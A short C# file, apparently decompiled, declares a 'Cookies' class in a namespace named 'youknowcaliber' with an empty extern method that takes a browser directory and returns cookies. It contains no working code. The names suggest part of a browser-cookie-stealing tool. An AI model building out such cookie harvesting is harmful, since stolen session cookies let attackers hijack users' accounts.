using System.Collections.Generic;

namespace youknowcaliber.Cookies;

internal class Cookies
{
	public static extern List<Cookie> Get(string BrowserDir);

	public extern Cookies();
}
